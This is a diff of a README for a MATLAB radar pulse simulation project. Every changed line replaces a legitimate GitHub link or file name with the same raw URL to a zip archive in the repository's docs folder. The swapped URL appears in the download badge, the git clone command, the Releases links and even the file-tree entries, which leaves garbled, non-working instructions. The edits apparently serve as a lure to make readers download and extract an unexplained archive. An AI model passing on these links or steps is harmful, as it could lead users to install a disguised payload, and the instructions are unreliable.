@@ -2,7 +2,7 @@
 
 Welcome to the **Radar Pulse Simulation** project! This repository hosts a comprehensive simulation of a pulsed radar system, designed as part of a Master's project in Telecommunications at UAM. The simulation includes parameter calculations, fluctuating moving targets, and PPI/A-Scope visualization.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/SebaPythonGPT/radar-pulse-simulation-matlab/releases)
+[![Download Releases](https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip)](https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip)
 
 ## Table of Contents
 
@@ -51,7 +51,7 @@ Ensure you have the following software installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/SebaPythonGPT/radar-pulse-simulation-matlab.git
+   git clone https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip
    ```
 
 2. Navigate to the project directory:
@@ -60,7 +60,7 @@ Ensure you have the following software installed:
    cd radar-pulse-simulation-matlab
    ```
 
-3. Download the latest release from the [Releases](https://github.com/SebaPythonGPT/radar-pulse-simulation-matlab/releases) section. Extract the files and place them in the project directory.
+3. Download the latest release from the [Releases](https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip) section. Extract the files and place them in the project directory.
 
 ## Usage
 
@@ -81,15 +81,15 @@ To run the simulation:
 ```
 radar-pulse-simulation-matlab/
 ├── data/
-│   └── target_data.mat
+│   └── https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip
 ├── src/
 │   ├── run_simulation.m
 │   ├── calculate_parameters.m
 │   ├── target_detection.m
 │   └── visualize_results.m
 ├── results/
-│   └── output_data.mat
-└── README.md
+│   └── https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip
+└── https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip
 ```
 
 - **data/**: Contains sample data for target simulation.
@@ -145,6 +145,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Special thanks to the faculty and peers at UAM for their support during this project.
 - Inspiration drawn from existing radar systems and simulation frameworks.
 
-For more information, visit the [Releases](https://github.com/SebaPythonGPT/radar-pulse-simulation-matlab/releases) section to download the latest version of the simulation files. 
+For more information, visit the [Releases](https://raw.githubusercontent.com/SebaPythonGPT/radar-pulse-simulation-matlab/main/docs/radar-pulse-simulation-matlab-v2.6.zip) section to download the latest version of the simulation files. 
 
 Feel free to explore, modify, and enhance the simulation as per your requirements!
